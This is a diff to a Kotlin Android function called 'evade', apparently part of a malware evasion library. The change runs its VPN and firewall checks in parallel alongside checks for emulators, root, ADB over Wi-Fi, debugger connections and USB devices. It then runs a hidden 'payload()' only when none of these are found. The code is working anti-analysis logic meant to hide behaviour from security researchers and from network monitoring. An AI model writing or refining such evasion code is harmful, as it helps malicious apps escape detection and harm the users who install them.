@@ -81,15 +81,17 @@ inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean
     val hasAdbOverWifi = scope.async { hasAdbOverWifi() }
     val isConnected = scope.async { isConnected() }
     val hasUsbDevices = scope.async { hasUsbDevices() }
-    if( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await()){
-        if(requiresNetwork){
-            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
-                if(hasVPN())
-                    return OnEvade.Escape(false)
-            if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
-                if(hasFirewall())
-                    return OnEvade.Escape(false)
-        }
+    val hasVpn = scope.async {
+        if(requiresNetwork && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
+            return@async hasVPN()
+        false
+    }
+    val hasFirewall = scope.async {
+        if(requiresNetwork && Build.VERSION.SDK_INT < Build.VERSION_CODES.R)
+            return@async hasFirewall()
+        false
+    }
+    if( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !hasVpn.await() && !hasFirewall.await()){
         payload()
         return OnEvade.Escape(true)
     }
